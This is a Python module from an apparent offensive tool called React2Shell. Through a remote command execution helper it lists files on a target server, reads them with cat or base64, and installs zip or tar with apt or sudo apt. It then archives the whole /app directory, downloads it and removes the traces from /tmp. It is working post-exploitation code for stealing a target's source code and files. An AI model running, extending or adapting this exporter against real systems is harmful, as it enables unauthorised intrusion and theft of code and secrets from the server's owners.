"""Export service for React2Shell - handles file and archive exports."""

import os
import re
import tempfile
import zipfile
import tarfile
import base64
import random
import string
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Callable
from datetime import datetime
from urllib.parse import unquote

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class ExportError(Exception):
    """Export-related error."""
    pass


class Exporter:
    """Handle file and archive exports from target."""
    
    DEFAULT_IGNORE_PATTERNS = [
        '.git/', '.gitignore', '.gitattributes',
        'node_modules/', '.next/', '.cache/',
        'dist/', 'build/', 'out/',
        '.env', '.env.local', '.env.*.local',
        '*.log', '*.tmp', '*.swp', '*.swo',
        '.DS_Store', 'Thumbs.db',
        'coverage/', '.nyc_output/',
        '.idea/', '.vscode/', '.vs/',
    ]
    
    def __init__(self, target_url: str, timeout: int = 10, verify_ssl: bool = True, 
                 windows: bool = False, proxies: Optional[Dict] = None, export_dir: Optional[str] = None):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.windows = windows
        self.proxies = proxies
        self.base_path = "/app"
        self.export_dir = export_dir
    
    def _execute_command(self, command: str, base64_encode: bool = True, timeout: Optional[int] = None) -> Dict:
        """Execute command on target and return result."""
        if not REQUESTS_AVAILABLE:
            raise ExportError("requests library not available")
        
        try:
            from ..classes.executor import execute_command
            cmd_timeout = timeout if timeout is not None else self.timeout
            return execute_command(
                self.target_url, command, cmd_timeout, 
                self.verify_ssl, self.windows, 
                base64_encode=base64_encode, proxies=self.proxies
            )
        except Exception as e:
            raise ExportError(f"Command execution failed: {e}")
    
    def _install_package(self, package: str, progress_callback: Optional[Callable] = None) -> bool:
        """Try to install a package on the target system."""
        if progress_callback:
            progress_callback(f"Checking if {package} is installed...")
        
        check_cmd = f"which {package} 2>/dev/null || command -v {package} 2>/dev/null"
        result = self._execute_command(check_cmd)
        if result.get("success") and result.get("output", "").strip():
            if progress_callback:
                progress_callback(f"{package} is already installed")
            return True
        
        install_commands = [
            f"apt update -qq && apt install -y {package} 2>&1",
            f"sudo apt update -qq && sudo apt install -y {package} 2>&1",
        ]
        
        for cmd in install_commands:
            if progress_callback:
                progress_callback(f"Installing {package}...")
            
            result = self._execute_command(cmd)
            
            if progress_callback:
                progress_callback(f"Checking {package} availability...")
            
            check_result = self._execute_command(check_cmd)
            if check_result.get("success") and check_result.get("output", "").strip():
                if progress_callback:
                    progress_callback(f"{package} installed successfully")
                return True
        
        if progress_callback:
            progress_callback(f"Failed to install {package}")
        return False
    
    def _get_gitignore_patterns(self) -> List[str]:
        """Get .gitignore patterns from target or use defaults."""
        result = self._execute_command(f"cat {self.base_path}/.gitignore 2>/dev/null || echo ''", base64_encode=False)
        patterns = []
        
        if result.get("success") and result.get("output"):
            content = result["output"]
            for line in content.split('\n'):
                line = line.strip()
                if line and not line.startswith('#'):
                    patterns.append(line)
        
        if patterns:
            all_patterns = self.DEFAULT_IGNORE_PATTERNS + patterns
            return list(set(all_patterns))
        else:
            return self.DEFAULT_IGNORE_PATTERNS
    
    def _should_ignore(self, path: str, ignore_patterns: List[str]) -> bool:
        """Check if path should be ignored based on patterns."""
        path = path.replace('\\', '/')
        
        for pattern in ignore_patterns:
            pattern = pattern.strip()
            if not pattern:
                continue
            
            if pattern.endswith('/'):
                pattern_base = pattern.rstrip('/')
                if pattern_base in path or path.startswith(pattern_base + '/'):
                    return True
            elif '*' in pattern or '?' in pattern:
                pattern_re = pattern.replace('*', '.*').replace('?', '.').replace('.', r'\.')
                if re.search(pattern_re, path):
                    return True
            else:
                if pattern in path or path.startswith(pattern + '/'):
                    return True
        return False
    
    def _get_file_tree(self, base_path: str = None) -> List[Dict]:
        """Get file tree from target."""
        if base_path is None:
            base_path = self.base_path
        
        # Use find command to get file tree
        if self.windows:
            cmd = f'powershell -c "Get-ChildItem -Path {base_path} -Recurse -File | Select-Object FullName, Length"'
        else:
            cmd = f'find {base_path} -type f 2>/dev/null | head -1000'
        
        result = self._execute_command(cmd)
        files = []
        
        if result.get("success") and result.get("output"):
            for line in result["output"].split('\n'):
                line = line.strip()
                if line and not line.startswith('find:'):
                    files.append({
                        'path': line,
                        'relative_path': line.replace(base_path, '').lstrip('/')
                    })
        
        return files
    
    def export_file(self, file_path: str, output_dir: str = None) -> Dict:
        """Export a single file from target."""
        # Use configured export_dir or default
        if output_dir is None:
            if self.export_dir:
                # Expand ~ if present
                export_base = Path(self.export_dir).expanduser()
            else:
                export_base = Path.home() / ".r2s" / "exports"
        else:
            export_base = Path(output_dir).expanduser()
        
        # Extract domain from target_url (remove http:// or https://)
        from urllib.parse import urlparse
        parsed_url = urlparse(self.target_url)
        domain = parsed_url.netloc or parsed_url.path.split('/')[0]
        if not domain:
            domain = "unknown"
        
        output_dir = export_base / domain
        output_dir.mkdir(parents=True, exist_ok=True)
        
        if not file_path.startswith('/'):
            file_path = f"{self.base_path}/{file_path}"
        
        is_binary = file_path.endswith('.zip') or file_path.endswith('.tar.gz') or file_path.endswith('.tar') or file_path.endswith('.gz')
        
        if is_binary:
            if self.windows:
                cmd = f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{file_path}\'))"'
            else:
                cmd = f'base64 -w 0 "{file_path}" 2>/dev/null || base64 "{file_path}" 2>/dev/null'
            
            result = self._execute_command(cmd, base64_encode=False)
            
            if not result.get("success"):
                raise ExportError(f"Failed to read file: {result.get('error', 'Unknown')}")
            
            base64_content = (result.get("output") or "").strip()
            if not base64_content:
                raise ExportError("File read returned empty output")
            
            try:
                content_bytes = base64.b64decode(base64_content)
            except Exception as e:
                raise ExportError(f"Failed to decode base64 content: {e}")
        else:
            if self.windows:
                cmd = f'type "{file_path}"'
            else:
                cmd = f'cat "{file_path}"'
            
            result = self._execute_command(cmd)
            
            if not result.get("success"):
                raise ExportError(f"Failed to read file: {result.get('error', 'Unknown')}")
            
            content = result.get("output", "")
            content_bytes = content.encode('utf-8')
        
        relative_path = file_path.replace(self.base_path, '').lstrip('/')
        if not relative_path:
            relative_path = Path(file_path).name
        
        output_path = output_dir / relative_path
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_path, 'wb') as f:
            f.write(content_bytes)
        
        file_size = len(content_bytes)
        if is_binary:
            metadata = {
                'path': str(output_path),
                'relative_path': relative_path,
                'size': file_size,
                'lines': 0,
                'chars': file_size,
                'extension': Path(relative_path).suffix,
                'is_binary': True,
            }
        else:
            content_str = content_bytes.decode('utf-8', errors='replace')
            metadata = {
                'path': str(output_path),
                'relative_path': relative_path,
                'size': file_size,
                'lines': len(content_str.split('\n')),
                'chars': len(content_str),
                'extension': Path(relative_path).suffix,
                'is_binary': False,
            }
        
        return {
            'success': True,
            'file_path': str(output_path),
            'metadata': metadata
        }
    
    def export_archive(self, output_dir: str = None, progress_callback: Optional[Callable] = None) -> Dict:
        """Export entire app directory as archive."""
        # Use configured export_dir or default
        if output_dir is None:
            if self.export_dir:
                # Expand ~ if present
                export_base = Path(self.export_dir).expanduser()
            else:
                export_base = Path.home() / ".r2s" / "exports"
        else:
            export_base = Path(output_dir).expanduser()
        
        # Extract domain from target_url (remove http:// or https://)
        from urllib.parse import urlparse
        parsed_url = urlparse(self.target_url)
        domain = parsed_url.netloc or parsed_url.path.split('/')[0]
        if not domain:
            domain = "unknown"
        
        output_dir = export_base / domain
        output_dir.mkdir(parents=True, exist_ok=True)
        
        if progress_callback:
            progress_callback("Reading .gitignore patterns...")
        ignore_patterns = self._get_gitignore_patterns()
        
        packages = ['zip', 'tar']
        installed_package = None
        
        for package in packages:
            if self._install_package(package, progress_callback):
                installed_package = package
                break
        
        if not installed_package:
            raise ExportError("Could not install zip or tar package")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archive_name = f"r2s_export_{timestamp}"
        server_archive_name = f"r2s_export_{timestamp}"
        server_archive_path = f"/tmp/{server_archive_name}.zip"
        
        if progress_callback:
            progress_callback("Cleaning up old archives...")
        cleanup_cmd = f"rm -f /tmp/r2s_export_*.zip 2>/dev/null || true"
        self._execute_command(cleanup_cmd, base64_encode=False)
        
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_archive = Path(tmpdir) / f"{server_archive_name}.zip"
            
            if progress_callback:
                progress_callback("Creating archive (this may take a while)...")
            
            if installed_package == 'zip':
                exclude_args = []
                for pattern in ignore_patterns[:30]:
                    if pattern.endswith('/'):
                        exclude_args.append(f'"{pattern}*"')
                    elif '*' in pattern or '?' in pattern:
                        exclude_args.append(f'"{pattern}"')
                    else:
                        exclude_args.append(f'"{pattern}"')
                
                exclude_str = ' '.join([f'-x {arg}' for arg in exclude_args]) if exclude_args else ''
                
                cmd = f"cd {self.base_path} && zip -r {server_archive_path} * {exclude_str} 2>&1"
                result = self._execute_command(cmd, base64_encode=False, timeout=0)
                
                zip_output = (result.get("output") or "")
                zip_success = result.get("success", False)
                zip_error = result.get("error", "")
                
                if progress_callback:
                    progress_callback("Verifying archive creation...")
                
                import time
                time.sleep(2)
                
                archive_exists = False
                check_output = ""
                ls_output = ""
                
                for attempt in range(5):
                    check_cmd = f"test -f {server_archive_path} && echo 'EXISTS' || echo 'MISSING'"
                    check_result = self._execute_command(check_cmd, base64_encode=False, timeout=10)
                    check_output = (check_result.get("output") or "").strip()
                    
                    if "EXISTS" in check_output:
                        archive_exists = True
                        break
                    
                    ls_cmd = f"ls {server_archive_path} 2>/dev/null | grep -q {server_archive_name} && echo 'EXISTS' || echo 'MISSING'"
                    ls_result = self._execute_command(ls_cmd, base64_encode=False, timeout=10)
                    ls_output = (ls_result.get("output") or "").strip()
                    
                    if "EXISTS" in ls_output:
                        archive_exists = True
                        break
                    
                    ls_simple_cmd = f"ls {server_archive_path} 2>&1"
                    ls_simple_result = self._execute_command(ls_simple_cmd, base64_encode=False, timeout=10)
                    ls_simple_output = (ls_simple_result.get("output") or "").strip()
                    
                    if server_archive_name in ls_simple_output and "No such file" not in ls_simple_output and "cannot access" not in ls_simple_output.lower():
                        archive_exists = True
                        break
                    
                    if attempt < 4:
                        time.sleep(2 + attempt)
                
                if not archive_exists:
                    zip_success_indicators = [
                        "adding:",
                        "updating:",
                        "deflated",
                        "stored"
                    ]
                    
                    has_success_indicators = any(indicator in zip_output.lower() for indicator in zip_success_indicators)
                    
                    if has_success_indicators:
                        if progress_callback:
                            progress_callback("Warning: Verification failed but zip output suggests success. Attempting download...")
                        archive_exists = True
                    else:
                        error_msg = f"Archive was not created at {server_archive_path}."
                        if zip_error:
                            error_msg += f" Error: {zip_error}"
                        if zip_output:
                            error_msg += f" Zip output: {zip_output[:1000]}"
                        if not zip_output and not zip_error:
                            error_msg += " No output from zip command (may have timed out or been blocked)."
                        error_msg += f" Verification attempts: check='{check_output[:100]}', ls='{ls_output[:100]}'"
                        raise ExportError(error_msg)
                
                if progress_callback:
                    progress_callback("Downloading archive...")
                
                file_result = self.export_file(server_archive_path, output_dir=str(output_dir))
                
                if not file_result.get("success"):
                    self._execute_command(f"rm -f {server_archive_path} 2>/dev/null || true", base64_encode=False)
                    raise ExportError(f"Failed to download archive: {file_result.get('error', 'Unknown error')}")
                
                downloaded_path = Path(file_result['file_path'])
                final_archive = output_dir / f"{archive_name}.zip"
                if downloaded_path.exists():
                    shutil.move(str(downloaded_path), str(final_archive))
                else:
                    self._execute_command(f"rm -f {server_archive_path} 2>/dev/null || true", base64_encode=False)
                    raise ExportError(f"Downloaded file not found: {downloaded_path}")
                
                if progress_callback:
                    progress_callback("Cleaning up server...")
                self._execute_command(f"rm -f {server_archive_path} 2>/dev/null || true", base64_encode=False)
                
                tmp_archive = final_archive
            else:
                exclude_args = []
                for pattern in ignore_patterns[:20]:
                    exclude_args.append(f"--exclude={pattern}")
                
                exclude_str = ' '.join(exclude_args) if exclude_args else ''
                tmp_archive_name = server_archive_name
                cmd = f"cd {self.base_path} && tar -czf /tmp/{tmp_archive_name}.tar.gz {exclude_str} . 2>&1 || true"
                result = self._execute_command(cmd)
                
                if progress_callback:
                    progress_callback("Downloading archive...")
                
                download_cmd = f"base64 -w 0 /tmp/{tmp_archive_name}.tar.gz 2>/dev/null || base64 /tmp/{tmp_archive_name}.tar.gz 2>/dev/null"
                download_result = self._execute_command(download_cmd, base64_encode=False)
                
                if download_result.get("success") and download_result.get("output"):
                    try:
                        tar_data = base64.b64decode(download_result["output"])
                        tar_tmp = Path(tmpdir) / f"{tmp_archive_name}.tar.gz"
                        with open(tar_tmp, 'wb') as f:
                            f.write(tar_data)
                        
                        if progress_callback:
                            progress_callback("Converting to zip format...")
                        
                        with tarfile.open(tar_tmp, 'r:gz') as tar:
                            with zipfile.ZipFile(tmp_archive, 'w', zipfile.ZIP_DEFLATED) as zipf:
                                for member in tar.getmembers():
                                    if not self._should_ignore(member.name, ignore_patterns):
                                        try:
                                            file_data = tar.extractfile(member)
                                            if file_data:
                                                zipf.writestr(member.name, file_data.read())
                                        except Exception:
                                            pass
                    except Exception as e:
                        raise ExportError(f"Failed to process archive: {e}")
                else:
                    raise ExportError("Failed to download archive")
            
            if installed_package != 'zip':
                if progress_callback:
                    progress_callback("Cleaning up server...")
                self._execute_command(f"rm -f /tmp/{tmp_archive_name}* 2>/dev/null || true", base64_encode=False)
            
            # For tar.gz, we still need to move the converted zip
            if installed_package != 'zip':
                final_archive = output_dir / f"{archive_name}.zip"
                if tmp_archive.exists():
                    shutil.move(str(tmp_archive), str(final_archive))
                else:
                    raise ExportError(f"Archive file not found: {tmp_archive}")
            else:
                # For zip, final_archive is already set above
                pass
            
            # Get file tree and metadata
            if progress_callback:
                progress_callback("Analyzing archive...")
            metadata = self._analyze_archive(str(final_archive))
            files = self._get_archive_file_list(str(final_archive))
            
            return {
                'success': True,
                'archive_path': str(final_archive),
                'files': files,
                'metadata': metadata
            }
    
    def _get_archive_file_list(self, archive_path: str) -> List[str]:
        """Get list of file paths from archive."""
        files = []
        try:
            with zipfile.ZipFile(archive_path, 'r') as zipf:
                for info in zipf.infolist():
                    if not info.is_dir():
                        files.append(info.filename)
        except Exception:
            pass
        return files
    
    def _analyze_archive(self, archive_path: str) -> Dict:
        """Analyze archive and return metadata."""
        metadata = {
            'total_files': 0,
            'total_size': 0,
            'extensions': {},
            'total_lines': 0,
            'total_chars': 0,
        }
        
        try:
            with zipfile.ZipFile(archive_path, 'r') as zipf:
                for info in zipf.infolist():
                    if not info.is_dir():
                        metadata['total_files'] += 1
                        metadata['total_size'] += info.file_size
                        
                        ext = Path(info.filename).suffix or 'no_ext'
                        metadata['extensions'][ext] = metadata['extensions'].get(ext, 0) + 1
                        
                        # Try to count lines/chars for text files
                        try:
                            content = zipf.read(info.filename).decode('utf-8', errors='ignore')
                            metadata['total_lines'] += len(content.split('\n'))
                            metadata['total_chars'] += len(content)
                        except Exception:
                            pass
        except Exception:
            pass
        
        return metadata
